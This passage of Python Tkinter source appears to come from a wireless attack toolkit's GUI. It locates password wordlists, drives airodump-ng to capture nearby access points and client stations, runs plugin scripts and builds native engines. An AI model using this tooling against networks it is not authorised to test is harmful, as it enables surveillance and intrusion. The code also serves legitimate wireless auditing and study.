            for p in ["/usr/share/wordlists","/usr/share/dict","/usr/share/seclists/Passwords"]:
                pp = Path(p)
                if pp.is_dir():
                    for f in sorted(pp.rglob("*"))[:150]:
                        if f.is_file() and f.stat().st_size > 1000:
                            sz = f.stat().st_size
                            for u in ["B","KB","MB","GB"]:
                                if sz < 1024: break
                                sz /= 1024
                            found.append(f"{f.name:<30} {sz:.1f}{u}")
            self.root.after(0, lambda: (self.wordlist_text.delete("1.0","end"),
                             self.wordlist_text.insert("1.0","\n".join(found) if found else "No wordlists found")))
        threading.Thread(target=scan, daemon=True).start()
        return f

    def _browse_file(self, var):
        fn = filedialog.askopenfilename(title="Select File")
        if fn: var.set(fn)

    def _build_airodump(self):
        f = tk.Frame(self.content_area, bg=T["bg"])
        tk.Label(f, text="\U0001f4e1  AIRODUMP-NG", font=("Segoe UI",14,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="nw")
        tk.Label(f, text="Real-time 802.11 capture via airodump-ng — APs, stations, signal",
                 font=("Segoe UI",9), bg=T["bg"], fg=T["text_dim"]).pack(anchor="nw", pady=(0,4))

        ctrl = tk.Frame(f, bg=T["bg"]); ctrl.pack(fill="x", pady=(0,4))
        r, e, self.airodump_iface = self._labeled(ctrl, "Iface", LocalExecutor._detect_iface() or "")
        r.pack(side="left", padx=(0,6))
        tk.Label(ctrl, text="Ch:", font=("Segoe UI",8), bg=T["bg"], fg=T["text_dim"]).pack(side="left")
        self.airodump_che = tk.Entry(ctrl, font=("Segoe UI",9), bg=T["surface"], fg=T["fg"],
                                      insertbackground=T["accent"], relief="flat", borderwidth=0, width=5)
        self.airodump_che.pack(side="left", padx=2); self.airodump_che.insert(0,"11")

        self._start_btn = self._btn(ctrl, "\u25b6 START", self._ad_start, primary=True)
        self._start_btn.pack(side="left", padx=3)
        self._stop_btn = self._btn(ctrl, "\u25a0 STOP", self._ad_stop)
        self._stop_btn.pack(side="left", padx=3)
        self._stop_btn.configure(state="disabled", bg=T["error"], fg="white")
        self._btn(ctrl, "\u2715 Clear", lambda: (self.ad_ap.delete("1.0","end"), self.ad_sta.delete("1.0","end"))).pack(side="left", padx=3)

        display = tk.Frame(f, bg=T["bg"]); display.pack(fill="both", expand=True)
        apf = tk.Frame(display, bg=T["card"], highlightbackground=T["border"], highlightthickness=1)
        apf.pack(side="left", fill="both", expand=True, padx=(0,2))
        tk.Label(apf, text="  ACCESS POINTS", font=("Segoe UI",8,"bold"), bg=T["card"], fg=T["accent"]).pack(anchor="nw", pady=(2,0))
        self.ad_ap = tk.Text(apf, bg=T["card"], fg=T["fg"], font=("Consolas",7), relief="flat", borderwidth=0, padx=6, pady=3)
        self.ad_ap.pack(fill="both", expand=True)

        staf = tk.Frame(display, bg=T["card"], highlightbackground=T["border"], highlightthickness=1)
        staf.pack(side="left", fill="both", expand=True, padx=(2,0))
        tk.Label(staf, text="  STATIONS", font=("Segoe UI",8,"bold"), bg=T["card"], fg=T["accent"]).pack(anchor="nw", pady=(2,0))
        self.ad_sta = tk.Text(staf, bg=T["card"], fg=T["fg"], font=("Consolas",7), relief="flat", borderwidth=0, padx=6, pady=3)
        self.ad_sta.pack(fill="both", expand=True)
        return f

    def _ad_start(self):
        iface = self.airodump_iface.get().strip() or LocalExecutor._detect_iface() or ""
        ch = int(self.airodump_che.get().strip() or "11")
        self._ad_run(iface, ch)

    def _ad_stop(self):
        self.airodump_running = False
        if self.airodump_proc:
            try: self.airodump_proc.terminate()
            except: pass
        self._start_btn.configure(state="normal", bg=T["accent"])
        self._stop_btn.configure(state="disabled", bg=T["surface"], fg=T["fg"])
        tslog("[x] Airodump stopped", "yellow")

    def _ad_run(self, iface, channel):
        def worker():
            try:
                self.airodump_running = True
                cmd = ["sudo","airodump-ng","-c",str(channel),"--band","abg",iface,"--write","/tmp/hackit_ad","--output-format","csv"]
                self.airodump_proc = proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
                for line in proc.stdout:
                    if not self.airodump_running: break
                    self.airodump_buf += line
                    if len(self.airodump_buf) > 5000: self.airodump_buf = self.airodump_buf[-3000:]
                proc.wait()
            except Exception as e:
                tslog(f"[x] Airodump: {e}", "red")
            finally:
                self.airodump_running = False
                self.airodump_proc = None
        threading.Thread(target=worker, daemon=True).start()
        self._start_btn.configure(state="disabled", bg=T["text_dim"])
        self._stop_btn.configure(state="normal", bg=T["error"], fg="white")
        self._ad_poll()

    def _ad_poll(self):
        if not self.airodump_running and not self.airodump_buf:
            self.root.after(2000, self._ad_poll); return
        try:
            text = self.airodump_buf[-2000:]
            lines = text.splitlines()
            ap = [l for l in lines if any(k in l.upper() for k in ["BSSID","CH","SSID","PWR","BEACON","DATA","ENCR"]) or (":" in l[:18] and len(l)>30)]
            sta = [l for l in lines if any(k in l.upper() for k in ["STATION","PACKETS","CLIENT","PROBE"]) or (":" in l and len(l)>20 and not any(k in l.upper() for k in ["BSSID","CH","SSID","PWR"]))]
            self.ad_ap.delete("1.0","end")
            for l in ap[-30:]:
                tag = "purple" if "WPA3" in l or "SAE" in l else ("green" if "WPA2" in l else ("yellow" if "WEP" in l else ("orange" if "OPN" in l else "")))
                self.ad_ap.insert("end", l+"\n", tag or "")
            self.ad_sta.delete("1.0","end")
            for l in sta[-25:]: self.ad_sta.insert("end", l+"\n")
        except: pass
        self.root.after(1500, self._ad_poll)

    def _build_plugins(self):
        f = tk.Frame(self.content_area, bg=T["bg"])
        tk.Label(f, text="\U0001f50c  PLUGIN ENGINE", font=("Segoe UI",14,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="nw")
        tk.Label(f, text="Run Lua, Ruby, Python scripts against engines", font=("Segoe UI",9), bg=T["bg"], fg=T["text_dim"]).pack(anchor="nw", pady=(0,6))
        pd = WIRELESS / "plugins"; rows = tk.Frame(f, bg=T["bg"]); rows.pack(fill="both", expand=True)
        for lang in ["lua","ruby","python"]:
            ld = pd / lang / "scripts"
            card = tk.Frame(rows, bg=T["card"], highlightbackground=T["border"], highlightthickness=1, padx=10, pady=6)
            card.pack(fill="x", pady=2)
            tk.Label(card, text=f"{lang.upper()} ({ld})", font=("Segoe UI",10,"bold"), bg=T["card"], fg=T["accent"]).pack(anchor="w")
            scripts = sorted([s.name for s in ld.glob("*") if s.suffix in (".lua",".rb",".py",".sh")]) if ld.exists() else []
            if scripts:
                tk.Label(card, text=", ".join(scripts[:12]), font=("Segoe UI",8), bg=T["card"], fg=T["text_dim"], wraplength=700).pack(anchor="w", pady=1)
            else:
                tk.Label(card, text="(no scripts)", font=("Segoe UI",8,"italic"), bg=T["card"], fg=T["text_dim"]).pack(anchor="w", pady=1)
            sv = tk.StringVar()
            if scripts:
                m = tk.OptionMenu(card, sv, *scripts)
                m.configure(bg=T["surface"], fg=T["fg"], activebackground=T["hover"], relief="flat", highlightthickness=0)
                m.pack(side="left", padx=(0,6))
            self._btn(card, f"\u25b6 Run {lang.upper()}", lambda l=lang, s=sv: self._run_exec(f"do_plugin_{l}", {"script": s.get()}, f"Plugin {l}"),
                      primary=True).pack(side="right")
        return f

    def _build_build(self):
        f = tk.Frame(self.content_area, bg=T["bg"])
        tk.Label(f, text="\U0001f6e0\ufe0f  BUILD SYSTEM", font=("Segoe UI",14,"bold"), bg=T["bg"], fg=T["fg"]).pack(anchor="nw")
        tk.Label(f, text="Compile native engines — requires build tools", font=("Segoe UI",9), bg=T["bg"], fg=T["text_dim"]).pack(anchor="nw", pady=(0,6))

        for eng, d in [("Go","go_workers"),("Rust","rust_engine"),("C/C++","c_core"),("C#","hackitwireless-cs")]:
            card = tk.Frame(f, bg=T["card"], highlightbackground=T["border"], highlightthickness=1, padx=12, pady=6)
            card.pack(fill="x", pady=2)
            tk.Label(card, text=f"\u2699  {eng}", font=("Segoe UI",10,"bold"), bg=T["card"], fg=T["accent"]).pack(anchor="w")
            tk.Label(card, text=f"  {WIRELESS / d}", font=("Segeo UI",7), bg=T["card"], fg=T["text_dim"]).pack(anchor="w")
            ok = engine_health.get(eng.lower().split("/")[0], False) if isinstance(engine_health,dict) else False
            tk.Label(card, text="BUILT" if ok else "NOT BUILT", font=("Segoe UI",8),
                     bg=T["card"], fg=T["success"] if ok else T["warn"]).pack(anchor="w")
            self._btn(card, f"\u25b6 Build {eng}", lambda e=eng.lower().split("/")[0]: self._run_exec("do_build", {"component": e}, f"Build {e}"),
                      primary=True).pack(anchor="e")

        tk.Label(f, text="\nLocalExecutor active — system tools used instead", font=("Segoe UI",9),
                 bg=T["bg"], fg=T["text_dim"]).pack()
        self._btn(f, "\u25b6 BUILD ALL", lambda: self._run_exec("do_build", {"component":"all"},"Build All"),
                  primary=True).pack(anchor="e", pady=6)
        return f

# ──────────────────────────────────────────────────────────────
def main():
    global tk, ttk, messagebox, filedialog
    try:
        import ttkbootstrap as tb; tk = tb; ttk = tb
    except ImportError:
        import tkinter as tk; import tkinter.ttk as ttk
        from tkinter import messagebox, filedialog
    root = tk.Tk()
    HackITWirelessGUI(root)
    root.mainloop()

if __name__ == "__main__":
    main()
